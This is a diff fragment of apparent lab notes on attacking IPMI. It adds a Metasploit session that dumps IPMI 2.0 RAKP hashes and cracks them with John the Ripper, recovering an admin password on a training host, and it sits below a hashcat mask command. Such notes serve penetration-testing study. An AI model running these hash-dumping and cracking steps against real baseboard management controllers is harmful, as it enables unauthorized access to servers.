@@ -46,3 +46,28 @@ put the hash inside a file
 ```
 hashcat -m 7300 HASH_admin.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 ```
+
+```
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> ls
+[*] exec: ls
+
+Desktop  HASH_admin.txt  install.sh  JOHN_FILE.txt  odat  oracle-instantclient-sqlplus_19.6.0.0.0-0parrot2_amd64.deb  Templates
+[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> john JOHN_FILE.txt
+[*] exec: john JOHN_FILE.txt
+
+Created directory: /home/htb-ac-51753/.john
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 10 candidates buffered for the current salt, minimum 32 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+trinity          (10.129.202.5 admin)
+trinity          (10.129.202.5 admin)
+trinity          (10.129.202.5 admin)
+3g 0:00:00:10 DONE 2/3 (2024-01-12 22:05) 0.2955g/s 16331p/s 42160c/s 42160C/s 123456..9brooklyn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
